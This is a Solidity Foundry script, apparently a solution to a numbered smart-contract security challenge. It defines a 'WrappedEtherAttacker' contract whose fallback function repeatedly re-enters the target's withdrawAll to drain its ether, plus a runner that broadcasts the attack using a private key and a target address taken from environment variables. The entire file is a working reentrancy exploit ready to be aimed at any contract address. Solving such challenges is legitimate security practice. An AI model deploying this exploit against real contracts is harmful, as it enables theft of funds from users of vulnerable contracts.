// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {WrappedEther} from "../../src/04_WrappedEther/WrappedEther.sol";

contract WrappedEtherAttacker {
  
  WrappedEther public wrappedEther;
  uint256 immutable public i_amountToSend;

  constructor(address _wrappedEther, uint256 _amountToSend) payable {
    wrappedEther = WrappedEther(_wrappedEther);
    i_amountToSend = _amountToSend;
  }

  function attack() public {
    wrappedEther.deposit{value: i_amountToSend}(address(this));
    wrappedEther.withdrawAll();
    checkBalance();
  }

  function checkBalance() public view returns(uint256) {
    console.log("Balance: ", address(wrappedEther).balance);
    return address(wrappedEther).balance;
  }

  fallback() external payable {
    if(address(wrappedEther).balance >= i_amountToSend) {
      wrappedEther.withdrawAll();
    }
  }

}


contract WrappedEtherSolver is Script {
  
  uint256 user = vm.envUint("PRIVATE_KEY");
  uint256 constant public AMOUNT_TO_SEND = 1 ether;
  
  function run() public {
    vm.startBroadcast(user);
    WrappedEtherAttacker attacker = new WrappedEtherAttacker{value: AMOUNT_TO_SEND}(vm.envAddress("CONTRACT"), AMOUNT_TO_SEND);
    attacker.attack();
    vm.stopBroadcast();
  }
}